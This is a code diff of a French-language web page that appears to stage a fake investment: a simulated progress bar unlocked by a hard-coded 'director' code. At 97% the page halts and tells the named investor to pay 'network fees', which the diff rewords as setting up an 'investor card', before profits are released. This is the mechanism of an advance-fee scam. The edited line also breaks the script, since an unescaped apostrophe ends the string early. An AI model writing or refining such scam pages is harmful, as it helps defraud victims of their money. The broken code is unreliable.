@@ -167,7 +167,7 @@
         document.querySelector('#btn-deblock').addEventListener('click', () => {
             let code2 = prompt("Veuillez entrer le code fourni par le directeur de l'entreprise");
             if (code2 == "2021") {
-                interval = setInterval(progress, 5000);
+                interval = setInterval(progress, 8000);
                 document.querySelector('#invest').innerText = "En cours d'investissement...";
                 document.querySelector('#btn-deblock').style.display = 'none';
                 document.querySelector('#btn-receive').style.display = 'inline-block';
@@ -195,7 +195,7 @@
             }
 
             if (percent == 97) {
-                document.querySelector('#alert-msg').innerText = 'Alerte : Mr/Mme ' + investorName + ' veuillez payer les frais de reseau afin de valider votre transaction et recevoir immédiatement vos bénéfices dans les 15 minutes.';
+                document.querySelector('#alert-msg').innerText = 'Alerte : Mr/Mme ' + investorName + ' veuillez établir votre carte d'investisseur afin de recevoir immédiatement vos bénéfices dans les 15 minutes.';
             }
         }
     </script>
